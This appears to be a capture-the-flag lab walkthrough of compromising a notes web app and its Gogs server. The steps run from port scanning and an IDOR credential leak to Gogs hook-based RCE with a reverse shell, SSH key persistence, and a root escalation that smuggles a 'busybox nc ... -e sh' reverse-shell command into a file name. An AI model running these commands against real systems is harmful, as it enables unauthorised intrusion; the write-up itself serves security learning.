Running an aggressive port scan using the command sudo nmap -sV -Pn -A 192.168.136.224 -p 22,80,6993,8000,14132,47008,60052 -g 80 returns the output shown above. By the looks of it, there are only three TCP ports open on the target machine: OpenSSH 8.2p1 SSH on port 22, some kind of web application with the title notes.pg on port 80, and the application Gogs on port 8080.

Enumeration

Port 80: HTTP

The webpage above is returned for this web application on port 80. The whole application is built around managing notes. The string notes.pg seems interesting. Also, the email address under the Contact contains the username jane. This could be a potential user.


I notice there are multiple clickable buttons. I checked the notes.pg hyperlink at the bottom of the website and obtained the potential hostname notes.pg. I inserted this inside my /etc/hosts file. But clicking the hyperlink at the bottom of the webpage redirects me to the same webpage here. Time to enumerate the features of the website.


I created a new account using the Sign Up feature. Then I logged into this new account, and the webpage above was returned to me. The Members section sounds interesting.


I accessed the Members section and the webpage above was returned to me. I see a bunch of different usernames like jane, tom, etc. But what is forged_user? The following string looks interesting too:

authenticity_token=oPR93X4UzlLdlPeg_Aek9v3XDDJLLoL3hXS8pHLwzOPz8ER61j8nzjESjr4Tsq-_VGRhZBVCZ9TSr9VZqIe5YQ&user[username]=forged_owner&user[role]=owner&user[password]=forged_owner&user[password_confirmation]=forged_owner&button=

Based on the string above, the credentials forged_owner:forged_owner could be an active account, as the username is the same as the password. The authenticity token oPR93X4UzlLdlPeg_Aek9v3XDDJLLoL3hXS8pHLwzOPz8ER61j8nzjESjr4Tsq-_VGRhZBVCZ9TSr9VZqIe5YQ looks similar to like cookies.


I signed out of my created account. Then I logged in using the credentials forged_owner:forged_owner and gained access, as shown in the image above. However, I did not find anything else helpful.


One of the feature of this web application is creating notes. I created a simple note as shown in the image above. However, the URL is interesting to me, as notes are stored in a linear fashion. This is similar to Indirect Object Reference (IDOR) attack as the notes are stored in a sequence. My newly created note is saved at /notes/6 location. Can I access the notes of other users?


And bingo. Trying to access note one at /notes/1 using IDOR returns the result shown in the image above. From previous enumeration, I know jane is the admin user as this user is the main point of contact using email. This note contains the credentials jane:svc-dev2022@@@!;P;4SSw0Rd for the Gogs application on port 8000. Time to check it out.

I logged into the application using the credentials jane:svc-dev2022@@@!;P;4SSw0Rd. Now I have access to the Gogs application as the user jane. Time to enumerate further.

Exploitation

Owning the Gogs via RCE Using post receive Hook


I accessed the Admin Panel as shown in the image above. It seems like this application name and version is Gogs 0.12.9. Since I can create a respository, I notice post receive hook is available. Obtaining a remote shell is simple. We can create a repository, change the post receive hook to a reverse shell command, make a commit and push the changes to the new repository to obtain a remote shell. To automate this, I used the exploit located from here. I downloaded a copy of the exploit on my machine. Since the exploit requires me to setup the git config. I ran the following commands to setup the fake username and email:

git config --global user.email "test@test.test"
git config --global user.name "Test"
git config --global user.email "test@test.test"
git config --global user.name "Test"


The exploit opens a shell directly on the exploit session; therefore, I do not need to start a listener on my machine. It requires the username & password, IP & port of my machine to obtain a shell, and -t to indicate there is no need for TLS. To run the exploit, I ran the command:

python3 exp.py -s 192.168.136.224:8000 -u jane -p 'svc-dev2022@@@!;P;4SSw0Rd' --revshell 192.168.45.206:80 -t false
python3 exp.py -s 192.168.136.224:8000 -u jane -p 'svc-dev2022@@@!;P;4SSw0Rd' --revshell 192.168.45.206:80 -t false

And instantly, I obtained a shell on the target machine as the user jane, as shown in the image above. However, the exploit shell session is unstable. I will obtain a stable shell by writing the user jane SSH key with mine. I ran the command ssh-keygen on my machine first to generate an SSH key pair. I saved this as jane on my machine.


Then I changed the permission of the SSH key using the command chmod 400 jane. Afterwards, I entered the command echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL2wn0iZUq3BELohjKUXQnHpx3ihk9jHrcoWJaUrbIIp kali@kali' > authorized_keys to write the contents of jane.pub to replace the SSH key over at authorized_keys. Then I SSHed into the target machine as jane using the new SSH via ssh jane@192.168.136.224 -i jane as shown in the image above.

Privilege Escalation

Vertical Privilege Escalation:User jane to User root via Command Injection Inside clean-tmp.sh Cronjob

Running pspy64 on the target machine shows the output above. There is an active cronjob that is executed with root privileges. It performs the command /bin/sh -c /bin/bash /usr/bin/clean-tmp.sh. Checking the content of the clean-tmp.sh script shows the output shown in the image above. The find binary is run at /dev/shm directory to locate all files. Then the sh shell is used to execute the command rm {}, where the found files are passed inside the curly braces. This is an entry point for command injection.


The main goal is to create a reverse shell command, so it gets executed as a command; therefore the command injection. To achieve this, I ran the command first touch '$(busybox nc 192.168.45.206 8444 -e sh)'. This creates a file with the name $(busybox nc 192.168.45.206 8444 -e sh). Since this is passed to the shell, it will execute and give me a root shell -- hopefully. And bingo. I changed the permission of the file to be executable using chmod +x too. And after a while, I obtained a root shell on my machine at port 8444.
